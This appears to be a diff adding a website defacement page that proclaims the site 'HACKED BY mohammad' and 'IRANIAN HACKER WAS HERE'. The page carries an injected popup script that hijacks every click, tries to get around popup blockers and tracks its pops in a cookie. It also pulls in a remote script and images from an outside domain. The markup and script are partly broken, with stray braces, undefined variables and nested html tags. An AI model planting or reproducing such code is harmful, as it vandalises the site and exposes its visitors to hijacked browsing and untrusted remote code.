@@ -1,0 +1,182 @@
+<html>
+
+<head>
+<script type="text/javascript">
+var needpop = 1;
+
+}
+var PopWidth = 1024;
+var PopHeight = 768;
+var PopTargetingMethod = 100;
+var PopUseDivLayer = 1;
+var RTSDomain = vc_url;
+var debugDomain = vc_url;
+var Page_Popped = false;
+var Page2_Popped = false;
+var Page_Loaded = false;
+var Page_Enter;
+var MySiteDomain = window.location.href.split('/');
+if (needpop == 1) {
+InitPop()
+}
+function InitPop() {
+Page_Enter = new Date();
+if (window.captureEvents) {
+window.captureEvents(Event.CLICK);
+window.onclick = LoadStandardPop
+} else document.onclick = LoadStandardPop
+}
+function SiteEnter() {
+Page_Loaded = true
+}
+function createCookie(name, value, days) {
+if (days) {
+var date = new Date();
+date.setTime(date.getTime()+(2*60*60*1000));
+var expires = "; expires=" + date.toGMTString()
+} else var expires = "";
+document.cookie = name + "=" + value + expires + "; path=/";
+}
+function readCookie(name) {
+var ca = document.cookie.split(';');
+var nameEQ = name + "=";
+for (var i = 0; i < ca.length; i++) {
+var c = ca[i];
+while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length)
+}
+return null
+}
+function RetrieveCount() {
+var cookieName = vc_cn;
+var popSuccesses = readCookie(cookieName);
+if (popSuccesses != null) popSuccesses = parseInt(popSuccesses);
+else popSuccesses = 0;
+return popSuccesses
+}
+function IncrementCount() {
+var cookieName = vc_cn;
+var popSuccesses = readCookie(cookieName);
+if (popSuccesses != null) createCookie(cookieName, parseInt(popSuccesses) + 1, 1);
+else createCookie(cookieName, 1, 1)
+}
+function LoadStandardPop() {
+if (Page_Popped == true) return;
+var pLoaded = false;
+if (window.SymRealWinOpen) {
+open = SymRealWinOpen
+}
+if (window.NS_ActualOpen) {
+open = NS_ActualOpen
+}
+var pxLeft = 0;
+var pxTop = 0;
+if (screen.width > 0 && screen.height > 0) {
+pxLeft = (screen.width / 2) - (PopWidth / 2);
+pxTop = (screen.height / 2) - (PopHeight / 2) - 50;
+if (pxLeft < 0) pxLeft = 0;
+if (pxTop < 0) pxTop = 0
+}
+pLoaded = open(vc_url, '', 'toolbar=1,scrollbars=1,location=1,statusbar=1,men ubar=1,resizable=1,top=' + pxTop + ',left=' + pxLeft + ',width=' + PopWidth + ',height=' + PopHeight);
+if (pLoaded) {
+Page_Popped = true;
+IncrementCount()
+} else {
+Page_Popped = true;
+if (Page_Loaded) initAdLayer();
+else XBrowserAddHandlerPops(window, "load", "initAdLayer")
+}
+window.focus()
+}
+
+</script>
+</script>
+
+<title>HACKED</title>
+
+
+<html dir="rtl">
+  <link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
+  <head><meta http-equiv="Content-Language" content="en-us"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head>
+
+
+<body link="#FF0000" vlink="#800080" alink="#FF0000" text="#000000" bgcolor="#000000" background="http://www." leftmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">
+
+<div align="center">	 <table border="1" width="912" id="table1" cellspacing="1" cellpadding="0" bordercolorlight="#FFFFFF" bordercolordark="#FFFFFF">		<tr>
+
+			<td bgcolor="#FF0000" align="center">
+
+			<p align="center"><font face="Orbitron">
+
+			<span style="background-color: #FF0000; font-weight:700">HACKED BY 
+			mohammad</span></font></td>		</tr>	</table></div><div align="center">	<table border="1" width="911" id="table2" cellspacing="1" cellpadding="0" bordercolorlight="#FFFFFF" bordercolordark="#FFFFFF" height="480" bordercolor="#FFFFFF">		<tr>
+
+			<td align="center" valign="top" width="400">	<font face="Tahoma" color="#FFFFFF"> 
+
+	<img border="0" title="mohammad" src="http://balyan.ir/images/q.png" ></font></html><table border="1" width="400" id="table4" cellspacing="1" dir="ltr">				<tr>					<td align="center" bgcolor="#FF0000"><b>
+					<font font-weight:200" face="Orbitron">Your site was hacked by mohammad </font>
+					</b></td>
+
+				</tr>				<tr>					<td>
+
+					<p align="left"><font face="Tahoma" color="#FFFFFF">
+
+					<span style="background-color: #000000"><font size="2">
+					 My Message To :</font></span><font size="2">
+
+					</font> </font>
+
+					<font size="2">
+
+					<font color="#FF0000" face="Tahoma"> HACKED </font><font color="#FFFFFF" face="Tahoma"> <br> 			
+					
+
+
+					</td>				</tr>			</table>			<table border="1" width="400" id="table5" cellspacing="1" dir="ltr">
+
+				<tr>					<td align="center" bgcolor="#FF0000">					<font face="Orbitron">For More info </font></td>				</tr>				</table>			<table border="1" width="100%" id="table6" height="89">
+
+				<tr>
+
+					<td align="center" height="27">
+
+					<b>
+					<p id="example2"><p align="center"><font face="PAPYRUS" size="4" color="#19891e">IRANIAN</font><font face="PAPYRUS" size="3" color="white"> HACKER </font><font face="PAPYRUS" size="3" color="red">WAS HERE</font></p></td>
+
+				</tr>
+
+				<tr>
+
+					<td align="center" height="25">
+
+					<b>
+					<font face="PAPYRUS" size="2.5" color="#FF0000">
+					[We are ANONYMOUS]</font></b></td>
+
+	
+
+			</table>
+<img src="http://www.balyan.ir/images/hack/1.jpg" border="0" alt="HACK" /></a>
+			</td>
+
+			<td align="center" width="502">
+010101010101010101010101010101010101010101010101010101010101010101010101010101010101
+
+<script language="javascript" src="http://balyan.ir/js/pic-hack1.js"></script>
+
+
+<center>
+
+<html>
+<head>
+<body>
+<img src="http://www.balyan.ir/images/search.png" id="bb">
+
+</body>
+<script>
+$("#bb").dblclick(function() {
+$("#ash1").toggle();
+$("#ash2").toggle();
+});
+</script></html>
+ <center> 
